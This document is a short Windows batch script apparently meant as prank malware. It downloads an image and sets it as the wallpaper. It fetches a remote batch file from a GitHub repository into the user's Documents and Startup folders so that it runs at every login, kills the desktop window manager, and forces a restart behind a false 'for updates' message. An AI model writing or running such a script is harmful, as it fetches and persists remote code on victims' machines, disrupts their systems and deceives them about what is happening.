@echo off
set "wallpaper=%USERPROFILE%\Documents\gipper.jpg"
set "dsk=%USERPROFILE%\Documents\fuck.bat"
set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\disable_power_off.bat"
powershell -Command "Invoke-WebRequest 'https://i3.ytimg.com/vi/HyHNuVaZJ-k/hq720.jpg' -OutFile '%wallpaper%'"
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/giggityfiles/fur/refs/heads/main/poweroptoff.bat?raw=true' -OutFile '%dsk%'"
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/giggityfiles/fur/refs/heads/main/poweroptoff.bat?raw=true' -OutFile '%startup%'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
taskkill /f /im dwm.exe
shutdown /f /r /t 30 /c "System will shut down in 30 seconds for updates."
